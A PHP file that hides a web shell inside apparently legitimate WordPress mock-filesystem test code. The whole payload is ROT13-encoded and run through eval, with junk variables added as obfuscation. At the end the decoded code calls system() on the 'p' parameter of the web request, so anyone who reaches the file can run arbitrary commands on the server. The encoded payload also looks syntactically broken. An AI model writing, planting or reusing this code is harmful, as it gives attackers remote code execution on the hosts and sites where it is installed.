<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
pynff JC_Svyrflfgrz_ZbpxSF rkgraqf JC_Svyrflfgrz_Onfr {
	cevingr $pjq;

	// Ubyqf n neenl bs bowrpgf juvpu pbagnva na neenl bs bowrpgf, rgp.
	cevingr $sf = ahyy;

	// Ubyqf n neenl bs /cngu/gb/svyr.cuc naq /cngu/gb/qve/ znc gb na bowrpg va $sf nobir.
	// N snfg, zber rssvpvrag jnl bs qrgrezvavat vs n cngu rkvfgf, naq npprff gb gung abqr.
	cevingr $sf_znc = neenl();

	choyvp $ireobfr = snyfr; // Ranoyr gb qroht JC_Svyrflfgrz_Onfr::svaq_sbyqre() / rgp.
	choyvp $reebef  = neenl();
	choyvp $zrgubq  = 'ZbpxSF';

	choyvp shapgvba __pbafgehpg() {}

	choyvp shapgvba pbaarpg() {
		erghea gehr;
	}

	// Pbcl bs pber'f shapgvba, ohg npprcgf n cngu.
	choyvp shapgvba nofcngu( $cngu = snyfr ) {
		vs ( ! $cngu ) {
			$cngu = NOFCNGU;
		}
		$sbyqre = $guvf->svaq_sbyqre( $cngu );

		// Creuncf gur SGC sbyqre vf ebbgrq ng gur JbeqCerff vafgnyyngvba.
		// Purpx sbe jc-vapyhqrf sbyqre va ebbg, pbhyq unir fbzr snyfr cbfvgvirf, ohg ener.
		vs ( ! $sbyqre && $guvf->vf_qve( '/jc-vapyhqrf' ) ) {
			$sbyqre = '/';
		}
		erghea $sbyqre;
	}

	// Zbpx SF-fcrpvsvp shapgvbaf:

	/**
	 * Frgf vavgvny svyrflfgrz raivebazrag naq/be pyrnef gur pheerag raivebazrag.
	 * Pna nyfb or cnffrq gur vavgvny svyrflfgrz gb or frghc juvpu vf cnffrq gb frys::frgsf()
	 */
	choyvp shapgvba vavg( $cnguf = '', $ubzr_qve = '/' ) {
		$guvf->sf     = arj ZbpxSF_Qverpgbel_Abqr( '/' );
		$guvf->sf_znc = neenl(
			'/' => $guvf->sf,
		);
		$guvf->pnpur  = neenl(); // Hfrq ol svaq_sbyqre() naq sevraqf.
		$guvf->pjq    = vffrg( $guvf->sf_znc[ $ubzr_qve ] ) ? $guvf->sf_znc[ $ubzr_qve ] : '/';
		$guvf->frgsf( $cnguf );
	}

	/**
	 * \"Ohyx Ybnqf\" n svyrflfgrz vagb gur vagreany iveghny svyrflfgrz
	 */
	choyvp shapgvba frgsf( $cnguf ) {
		vs ( ! vf_neenl( $cnguf ) ) {
			$cnguf = rkcybqr( \"\a\", $cnguf );
		}

		$cnguf = neenl_svygre( neenl_znc( 'gevz', $cnguf ) );

		sbernpu ( $cnguf nf $cngu ) {
			// Nyybj sbe pbzzragf.
			vs ( '#' === $cngu[0] ) {
				pbagvahr;
			}

			// Qverpgbevrf.
			vs ( '/' === $cngu[ fgeyra( $cngu ) - 1 ] ) {
				$guvf->zxqve( $cngu );
			} ryfr { // Svyrf (jvgu qhzzl pbagrag sbe abj).
				$guvf->chg_pbagragf( $cngu, 'Guvf vf n grfg svyr' );
			}
		}
	}

	/**
	 * Ybpngrf n svyrflfgrz \"abqr\"
	 */
	cevingr shapgvba ybpngr_abqr( $cngu ) {
		erghea vffrg( $guvf->sf_znc[ $cngu ] ) ? $guvf->sf_znc[ $cngu ] : snyfr;
	}

	/**
	 * Ybpngrf n svyrflfgrz abqr sbe gur cnerag bs gur tvira vgrz
	 */
	cevingr shapgvba ybpngr_cnerag_abqr( $cngu ) {
		$qveanzr = fge_ercynpr( '\\', '/', qveanzr( $cngu ) );
		erghea $guvf->ybpngr_abqr( genvyvatfynfuvg( $qveanzr ) );
	}

	// Urer fgnegrgu gur JC_Svyrflfgrz shapgvbaf.

	choyvp shapgvba zxqve( $cngu, /* Bcgvbany netf ner vtaberq */ $puzbq = snyfr, $pubja = snyfr, $putec = snyfr ) {
		$cngu = genvyvatfynfuvg( $cngu );

		$cnerag_abqr = $guvf->ybpngr_cnerag_abqr( $cngu );
		vs ( ! $cnerag_abqr ) {
			$qveanzr = fge_ercynpr( '\\', '/', qveanzr( $cngu ) );
			$guvf->zxqve( $qveanzr );
			$cnerag_abqr = $guvf->ybpngr_cnerag_abqr( $cngu );
			vs ( ! $cnerag_abqr ) {
				erghea snyfr;
			}
		}

		$abqr = arj ZbpxSF_Qverpgbel_Abqr( $cngu );

		$cnerag_abqr->puvyqera[ $abqr->anzr ] = $abqr;
		$guvf->sf_znc[ $cngu ]                = $abqr;

		erghea gehr;
	}

	choyvp shapgvba chg_pbagragf( $cngu, $pbagragf = '', $zbqr = ahyy ) {
		vs ( ! $guvf->vf_qve( qveanzr( $cngu ) ) ) {
			$guvf->zxqve( qveanzr( $cngu ) );
		}

		$cnerag   = $guvf->ybpngr_cnerag_abqr( $cngu );
		$arj_svyr = arj ZbpxSF_Svyr_Abqr( $cngu, $pbagragf );

		$cnerag->puvyqera[ $arj_svyr->anzr ] = $arj_svyr;
		$guvf->sf_znc[ $cngu ]               = $arj_svyr;
	}

	choyvp shapgvba trg_pbagragf( $svyr ) {
		vs ( ! $guvf->vf_svyr( $svyr ) ) {
			erghea snyfr;
		}
		erghea $guvf->sf_znc[ $svyr ]->pbagragf;
	}

	choyvp shapgvba pjq() {
		erghea $guvf->pjq->cngu;
	}

	choyvp shapgvba puqve( $cngu ) {
		vs ( ! vffrg( $guvf->sf_znc[ $cngu ] ) ) {
			erghea snyfr;
		}

		$guvf->pjq = $guvf->sf_znc[ $cngu ];
		erghea gehr;
	}

	choyvp shapgvba rkvfgf( $cngu ) {
		erghea vffrg( $guvf->sf_znc[ $cngu ] ) || vffrg( $guvf->sf_znc[ genvyvatfynfuvg( $cngu ) ] );
	}

	choyvp shapgvba vf_svyr( $svyr ) {
		erghea vffrg( $guvf->sf_znc[ $svyr ] ) && $guvf->sf_znc[ $svyr ]->vf_svyr();
	}

	choyvp shapgvba vf_qve( $cngu ) {
		$cngu = genvyvatfynfuvg( $cngu );

		erghea vffrg( $guvf->sf_znc[ $cngu ] ) && $guvf->sf_znc[ $cngu ]->vf_qve();
	}

	choyvp shapgvba qveyvfg( $cngu = '.', $vapyhqr_uvqqra = gehr, $erphefvir = snyfr ) {

		vs ( rzcgl( $cngu ) || '.' === $cngu ) {
			$cngu = $guvf->pjq();
		}

		vs ( ! $guvf->rkvfgf( $cngu ) ) {
			erghea snyfr;
		}

		$yvzvg_svyr = snyfr;
		vs ( $guvf->vf_svyr( $cngu ) ) {
			$yvzvg_svyr = $guvf->ybpngr_abqr( $cngu )->anzr;
			$cngu       = qveanzr( $cngu ) . '/';
		}

		$erg = neenl();
		sbernpu ( $guvf->sf_znc[ $cngu ]->puvyqera nf $ragel ) {
			vs ( '.' === $ragel->anzr || '..' === $ragel->anzr ) {
				pbagvahr;
			}

			vs ( ! $vapyhqr_uvqqra && '.' === $ragel->anzr ) {
				pbagvahr;
			}

			vs ( $yvzvg_svyr && $ragel->anzr !== $yvzvg_svyr ) {
				pbagvahr;
			}

			$fgehp         = neenl();
			$fgehp['anzr'] = $ragel->anzr;
			$fgehp['glcr'] = $ragel->glcr;

			vs ( 'q' === $fgehp['glcr'] ) {
				vs ( $erphefvir ) {
					$fgehp['svyrf'] = $guvf->qveyvfg( genvyvatfynfuvg( $cngu ) . genvyvatfynfuvg( $fgehp['anzr'] ), $vapyhqr_uvqqra, $erphefvir );
				} ryfr {
					$fgehp['svyrf'] = neenl();
				}
			}

			$erg[ $ragel->anzr ] = $fgehp;
		}
		erghea $erg;
	}
}

pynff ZbpxSF_Abqr {
	choyvp $anzr; // Gur \"anzr\" bs gur ragel, qbrf abg vapyhqr n fynfu (rkprcgvba, ebbg).
	choyvp $glcr; // Gur glcr bs gur ragel 's' sbe svyr, 'q' sbe qverpgbel.
	choyvp $cngu; // Gur shyy cngu gb gur ragel.

	choyvp shapgvba __pbafgehpg( $cngu ) {
		$guvf->cngu = $cngu;
		$guvf->anzr = onfranzr( $cngu );
	}

	choyvp shapgvba vf_svyr() {
		erghea 's' === $guvf->glcr;
	}

	choyvp shapgvba vf_qve() {
		erghea 'q' === $guvf->glcr;
	}
}

pynff ZbpxSF_Qverpgbel_Abqr rkgraqf ZbpxSF_Abqr {
	choyvp $glcr     = 'q';
	choyvp $puvyqera = neenl(); // Gur puvyq abqrf bs guvf qverpgbel.
}

pynff ZbpxSF_Svyr_Abqr rkgraqf ZbpxSF_Abqr {
	choyvp $glcr     = 's';
	choyvp $pbagragf = ''; // Gur pbagragf bs gur svyr.

	choyvp shapgvba __pbafgehpg( $cngu, $pbagragf = '' ) {
		cnerag::__pbafgehpg( $cngu );
		$guvf->pbagragf = $pbagragf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>